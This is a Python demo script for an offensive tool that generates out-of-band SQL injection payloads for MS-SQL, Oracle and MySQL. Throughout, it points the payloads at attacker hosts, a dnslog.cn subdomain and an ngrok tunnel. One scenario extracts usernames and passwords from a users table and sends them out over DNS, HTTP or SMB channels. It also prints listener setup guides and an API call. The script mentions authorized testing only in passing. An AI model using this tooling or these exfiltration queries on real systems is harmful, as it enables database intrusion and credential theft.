#!/usr/bin/env python3
"""
Demo script for OOB SQL Injection Payload Generator

This script demonstrates how to use the OOBPayloadGenerator to generate
Out-of-Band SQL injection payloads for MS-SQL, Oracle, and MySQL databases.
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.oob_payloads import OOBPayloadGenerator, DatabaseType


def print_section(title):
    """Print a formatted section header"""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)


def demo_basic_usage():
    """Demonstrate basic payload generation"""
    print_section("DEMO 1: Basic OOB Payload Generation")
    
    # Initialize generator
    generator = OOBPayloadGenerator("attacker.example.com", 80)
    print("\n✓ Initialized OOBPayloadGenerator")
    print(f"  Attacker Host: {generator.attacker_host}")
    print(f"  Attacker Port: {generator.attacker_port}")
    
    # Generate MS-SQL payloads
    print("\n→ Generating MS-SQL payloads...")
    mssql_payloads = generator.generate_mssql_payloads()
    print(f"  Generated {len(mssql_payloads)} MS-SQL payloads")
    
    # Generate Oracle payloads
    print("\n→ Generating Oracle payloads...")
    oracle_payloads = generator.generate_oracle_payloads()
    print(f"  Generated {len(oracle_payloads)} Oracle payloads")
    
    # Generate MySQL payloads
    print("\n→ Generating MySQL payloads...")
    mysql_payloads = generator.generate_mysql_payloads()
    print(f"  Generated {len(mysql_payloads)} MySQL payloads")


def demo_mssql_payloads():
    """Demonstrate MS-SQL specific payloads"""
    print_section("DEMO 2: MS-SQL OOB Payloads")
    
    generator = OOBPayloadGenerator("10.0.0.1", 80)
    payloads = generator.generate_mssql_payloads("@@version")
    
    print(f"\nGenerated {len(payloads)} MS-SQL payloads for extracting @@version\n")
    
    for i, payload in enumerate(payloads, 1):
        print(f"─── Payload {i}: {payload.technique.value} ───")
        print(f"Description: {payload.description}")
        print(f"Listener Type: {payload.listener_type.upper()}")
        print(f"Requires Privileges: {payload.requires_privileges}")
        print(f"\nPayload Preview:")
        preview = payload.payload[:100] + "..." if len(payload.payload) > 100 else payload.payload
        print(f"  {preview}")
        print()


def demo_oracle_payloads():
    """Demonstrate Oracle specific payloads"""
    print_section("DEMO 3: Oracle OOB Payloads")
    
    generator = OOBPayloadGenerator("oracle-listener.attacker.com", 80)
    payloads = generator.generate_oracle_payloads("user")
    
    print(f"\nGenerated {len(payloads)} Oracle payloads for extracting current user\n")
    
    # Show one complete payload for each technique
    techniques_shown = set()
    for payload in payloads:
        if payload.technique not in techniques_shown:
            print(f"─── Technique: {payload.technique.value} ───")
            print(f"Description: {payload.description}")
            print(f"Listener Type: {payload.listener_type.upper()}")
            print(f"\nComplete Payload:")
            print(f"  {payload.payload}")
            print(f"\nListener Setup:")
            print(f"  {payload.example_listener_setup}")
            print()
            techniques_shown.add(payload.technique)


def demo_mysql_payloads():
    """Demonstrate MySQL specific payloads"""
    print_section("DEMO 4: MySQL OOB Payloads (Windows Only)")
    
    generator = OOBPayloadGenerator("192.168.1.100", 445)
    payloads = generator.generate_mysql_payloads("DATABASE()")
    
    print(f"\nGenerated {len(payloads)} MySQL payloads for extracting current database\n")
    print("⚠️  Note: MySQL OOB techniques require Windows environment with UNC path support\n")
    
    for i, payload in enumerate(payloads, 1):
        print(f"─── Payload {i}: {payload.technique.value} ───")
        print(f"Description: {payload.description}")
        print(f"Privilege Requirements: {payload.privilege_level}")
        print(f"\nPayload:")
        print(f"  {payload.payload}")
        print()


def demo_all_databases():
    """Demonstrate generating payloads for all databases at once"""
    print_section("DEMO 5: Generate Payloads for All Databases")
    
    generator = OOBPayloadGenerator("oob.attacker.com", 8080)
    all_payloads = generator.generate_all_payloads(data_to_exfiltrate="version()")
    
    print("\n→ Generated payloads for all supported databases:\n")
    
    for db_name, payloads in all_payloads.items():
        print(f"  {db_name.upper():12s} - {len(payloads)} payloads")
    
    print("\n→ Summary by listener type:")
    
    listener_counts = {}
    for db_name, payloads in all_payloads.items():
        for payload in payloads:
            listener_type = payload.listener_type
            listener_counts[listener_type] = listener_counts.get(listener_type, 0) + 1
    
    for listener_type, count in sorted(listener_counts.items()):
        print(f"  {listener_type.upper():8s} - {count} payloads")


def demo_listener_guides():
    """Demonstrate listener setup guides"""
    print_section("DEMO 6: Listener Setup Guides")
    
    generator = OOBPayloadGenerator()
    
    listener_types = ['http', 'smb', 'dns', 'ldap']
    
    for listener_type in listener_types:
        print(f"\n{'─' * 80}")
        print(f"  {listener_type.upper()} Listener Setup Guide")
        print('─' * 80)
        
        guide = generator.get_listener_setup_guide(listener_type)
        # Print first 300 characters of guide
        preview = guide[:300] + "..." if len(guide) > 300 else guide
        print(preview)


def demo_formatted_output():
    """Demonstrate formatted payload output"""
    print_section("DEMO 7: Formatted Payload Display")
    
    generator = OOBPayloadGenerator("demo.attacker.com", 80)
    payloads = generator.generate_oracle_payloads("banner")
    
    # Show formatted output for first payload
    print("\nExample of formatted payload output:\n")
    print(generator.format_payload_for_output(payloads[0]))


def demo_custom_scenarios():
    """Demonstrate custom scenarios"""
    print_section("DEMO 8: Custom Scenarios")
    
    print("\n→ Scenario 1: Extract MS-SQL database credentials")
    generator1 = OOBPayloadGenerator("creds.attacker.com", 80)
    payloads1 = generator1.generate_mssql_payloads("(SELECT TOP 1 username+':'+password FROM users)")
    print(f"  Generated {len(payloads1)} payloads for credential extraction")
    print(f"  Sample payload: {payloads1[0].payload[:80]}...")
    
    print("\n→ Scenario 2: Oracle DNS exfiltration with dnslog.cn")
    generator2 = OOBPayloadGenerator("abc123.dnslog.cn", 53)
    payloads2 = generator2.generate_oracle_payloads("(SELECT table_name FROM all_tables WHERE ROWNUM=1)")
    dns_payloads = [p for p in payloads2 if 'UTL_INADDR' in p.payload]
    if dns_payloads:
        print(f"  Generated DNS payload for dnslog.cn")
        print(f"  Listener: Visit http://dnslog.cn to see DNS queries")
        print(f"  Sample payload: {dns_payloads[0].payload[:80]}...")
    
    print("\n→ Scenario 3: MySQL with ngrok tunnel")
    generator3 = OOBPayloadGenerator("abc123.ngrok-free.app", 80)
    payloads3 = generator3.generate_mysql_payloads("USER()")
    print(f"  Generated {len(payloads3)} payloads for ngrok tunnel")
    print(f"  Setup: Run 'ngrok http 80' to create tunnel")
    print(f"  Sample payload: {payloads3[0].payload[:80]}...")


def demo_privilege_requirements():
    """Demonstrate checking privilege requirements"""
    print_section("DEMO 9: Privilege Requirements Summary")
    
    generator = OOBPayloadGenerator("priv.attacker.com", 80)
    all_payloads = generator.generate_all_payloads()
    
    print("\n→ Privilege requirements by database:\n")
    
    for db_name, payloads in all_payloads.items():
        print(f"\n{db_name.upper()}:")
        privilege_info = set()
        for payload in payloads:
            privilege_info.add((payload.requires_privileges, payload.privilege_level))
        
        for requires_priv, priv_level in privilege_info:
            status = "✓ REQUIRED" if requires_priv else "✗ NOT REQUIRED"
            print(f"  {status}")
            if requires_priv:
                print(f"    └─ {priv_level}")


def main():
    """Run all demos"""
    print("""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              OOB SQL Injection Payload Generator - DEMO                   ║
║                                                                           ║
║  This demo showcases the capabilities of the OOBPayloadGenerator for     ║
║  generating Out-of-Band SQL injection payloads across multiple database  ║
║  systems (MS-SQL, Oracle, MySQL).                                        ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
""")
    
    try:
        # Run all demos
        demo_basic_usage()
        demo_mssql_payloads()
        demo_oracle_payloads()
        demo_mysql_payloads()
        demo_all_databases()
        demo_listener_guides()
        demo_formatted_output()
        demo_custom_scenarios()
        demo_privilege_requirements()
        
        # Summary
        print_section("DEMO COMPLETE")
        print("\n✓ All demonstrations completed successfully!")
        print("\nNext steps:")
        print("  1. Read the full guide: docs/OOB_SQL_INJECTION_GUIDE.md")
        print("  2. Set up your listener (HTTP, SMB, DNS, or LDAP)")
        print("  3. Generate payloads for your target database")
        print("  4. Test in authorized environments only")
        print("\nFor API usage examples:")
        print("  curl -X POST http://localhost:8000/sql_attacker/api/oob/generate/")
        print("       -H 'Content-Type: application/json'")
        print("       -d '{\"attacker_host\": \"your-host.com\"}'")
        print("\n" + "=" * 80 + "\n")
        
    except Exception as e:
        print(f"\n✗ Error during demo: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
